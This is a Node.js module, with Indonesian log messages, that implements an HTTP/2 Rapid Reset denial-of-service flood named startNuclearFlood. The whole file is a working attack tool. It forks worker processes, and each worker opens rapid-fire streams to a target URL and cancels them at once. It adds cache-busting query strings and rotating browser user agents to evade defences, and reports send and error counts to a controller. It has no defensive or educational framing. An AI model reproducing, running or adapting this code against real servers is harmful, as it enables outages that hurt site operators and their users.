const cluster = require('cluster');
const os = require('os');
const http2 = require('http2');
const url = require('url');
const crypto = require('crypto');

const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
];

function executeAttack(targetUrl, durationSeconds) { // This function runs in the worker process
    const streamsPerLoop = 500;
    let localSent = 0;
    let localError = 0;

    const statsInterval = setInterval(() => {
        if (process.send) {
            process.send({
                type: 'stats',
                sent: localSent,
                error: localError
            });
        }
        localSent = 0;
        localError = 0;
    }, 1000);

    const target = url.parse(targetUrl);
    const authority = `${target.protocol}//${target.host}`;

    console.log(`Worker ${process.pid} memulai serangan HTTP/2 Rapid Reset ke ${authority} selama ${durationSeconds} detik.`);

    const client = http2.connect(authority);
    client.on('error', () => {});
    client.on('socketError', () => {});

    let isAttackActive = true;
 
    const attack = () => {
        const headers = {
            [http2.constants.HTTP2_HEADER_METHOD]: 'GET',
            [http2.constants.HTTP2_HEADER_PATH]: `${target.path || '/'}${target.path && target.path.includes('?') ? '&' : '?'}_=${crypto.randomBytes(8).toString('hex')}`,
            [http2.constants.HTTP2_HEADER_SCHEME]: target.protocol.replace(':', ''),
            [http2.constants.HTTP2_HEADER_AUTHORITY]: target.host,
            'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
        };

        const stream = client.request(headers);
        stream.on('error', () => {
            localError++;
        });
        localSent++;
        stream.destroy();
    };
 
    const attackLoop = () => {
        if (isAttackActive && !client.destroyed) {
            for (let i = 0; i < streamsPerLoop; i++) {
                attack();
            }
            setImmediate(attackLoop);
        }
    };

    attackLoop();
 
    setTimeout(() => {
        isAttackActive = false;
        clearInterval(statsInterval);
        if (!client.destroyed) {
            client.destroy();
        }
        console.log(`Worker ${process.pid} telah menghentikan serangan ke ${authority}.`);
        process.exit(0);
    }, durationSeconds * 1000);
}

function startNuclearFlood(targetUrl, durationSeconds, statusCallback) { // This function runs in the master process
    if (cluster.isPrimary) { // Master process logic
        console.log(`Master ${process.pid} menyiapkan cluster untuk serangan.`);
        
        cluster.settings = {
            exec: __filename,
            args: [targetUrl, String(durationSeconds)],
            execArgv: ['--max-old-space-size=1024']
        };

        let totalSent = 0;
        let totalError = 0;
        let secondsRemaining = durationSeconds;

        const monitorInterval = setInterval(() => {
            secondsRemaining -= 5;
            if (secondsRemaining < 0) secondsRemaining = 0;

            const successRate = totalSent > 0 ? ((totalSent - totalError) / totalSent * 100).toFixed(2) : "0.00";

            statusCallback({
                totalSent,
                totalError,
                successRate,
                secondsRemaining
            });

            if (secondsRemaining <= 0) {
                clearInterval(monitorInterval);
            }
        }, 5000);

        const numCPUs = Math.min(os.cpus().length, 2);
        
        for (let i = 0; i < numCPUs; i++) {
            const worker = cluster.fork();
            worker.on('message', (message) => {
                if (message.type === 'stats') {
                    totalSent += message.sent || 0;
                    totalError += message.error || 0;
                }
            });
        }

        cluster.on('exit', (worker) => {
            console.log(`Worker ${worker.process.pid} telah berhenti.`);
        });

        const stopAttack = () => {
            console.log("Master menerima perintah stop. Menghentikan semua worker.");
            clearInterval(monitorInterval);
            for (const id in cluster.workers) {
                if (cluster.workers[id]) {
                    cluster.workers[id].kill();
                }
            }
        };

        return { stop: stopAttack };
    }
}

if (cluster.isWorker) { // Worker process logic
    const [targetUrl, durationSeconds] = process.argv.slice(2);
    executeAttack(targetUrl, parseInt(durationSeconds, 10));
}

module.exports = { startNuclearFlood };